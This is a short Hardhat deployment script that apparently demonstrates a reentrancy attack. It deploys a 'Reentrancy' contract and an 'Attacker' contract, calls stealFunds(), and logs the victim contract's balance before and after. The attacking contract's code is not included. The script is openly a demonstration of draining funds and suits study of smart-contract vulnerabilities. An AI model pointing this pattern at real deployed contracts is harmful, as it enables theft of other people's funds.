const { ethers } = require('hardhat')

const INIT_AMOUNT_REENTRANCY = ethers.utils.parseEther('0.001')
const INIT_AMOUNT_ATTACKER = ethers.utils.parseEther('1')

const balanceOf = async address =>
   ethers.utils.formatEther(await ethers.provider.getBalance(address))

async function main() {

   const [deployer] = await ethers.getSigners()
   console.log('Using network:', await ethers.provider.getNetwork())
   console.log('Deployer:', deployer.address)

   const Reentrancy = await ethers.getContractFactory('Reentrancy')
   const reentrancy = await Reentrancy.deploy({ value: INIT_AMOUNT_REENTRANCY })
   await reentrancy.deployed()
   console.log('Reentrancy deployed:', reentrancy.address)

   const Attacker = await ethers.getContractFactory('Attacker')
   const attacker = await Attacker.deploy(reentrancy.address, { value: INIT_AMOUNT_ATTACKER })
   await attacker.deployed()
   console.log('Attacker deployed:', attacker.address)

   console.log('Reentrancy balance before:', await balanceOf(reentrancy.address))
   await (await attacker.stealFunds()).wait()
   console.log('Reentrancy balance after:', await balanceOf(reentrancy.address))

   await reentrancy.claim()
   console.log('Locked:', await reentrancy.locked())
}

main()
   .catch(error => {
      console.error(error)
      process.exitCode = 1
   })
